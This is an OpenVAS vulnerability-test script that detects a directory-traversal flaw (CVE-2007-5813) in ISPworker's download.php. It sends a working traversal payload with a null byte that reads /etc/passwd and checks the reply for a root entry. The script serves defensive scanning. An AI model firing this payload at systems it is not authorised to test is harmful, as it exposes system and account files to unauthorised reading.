###############################################################################
# OpenVAS Vulnerability Test
# $Id: ISPworker_26277.nasl 4970 2017-01-09 15:00:59Z teissa $
#
# ISPworker Download.PHP Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ISPworker is prone to multiple directory-traversal vulnerabilities
because it fails to sufficiently sanitize user-supplied input.

Exploiting these issues may allow an attacker to obtain sensitive
information that could aid in further attacks.

These issues affect ISPworker 1.21 and 1.23; other versions may also
be affected.";


if (description)
{
 script_id(100370);
 script_version("$Revision: 4970 $");
 script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
 script_tag(name:"creation_date", value:"2009-12-02 17:30:58 +0100 (Wed, 02 Dec 2009)");
 script_bugtraq_id(26277);
 script_cve_id("CVE-2007-5813");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("ISPworker Download.PHP Multiple Directory Traversal Vulnerabilities");


 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/26277");
 script_xref(name : "URL" , value : "http://www.ispware.de/ispworker/index.php");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/ispworker",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/module/biz/index.php"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
  if( buf == NULL )continue;

  if(egrep(pattern: "Login - ISPworker", string: buf, icase: TRUE) &&
     egrep(pattern: "start_authentication", string: buf, icase: TRUE)) {
    
      url = string(dir,"/module/ticket/download.php?ticketid=../../../../../../../../../etc/passwd%00");
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req,bodyonly:FALSE);
      if( buf == NULL )exit(0);

      if(egrep(pattern: "root:.*:0:[01]:.*", string: buf, icase: TRUE)) {

        security_message(port:port);
        exit(0);

      }
  }
}

exit(0);
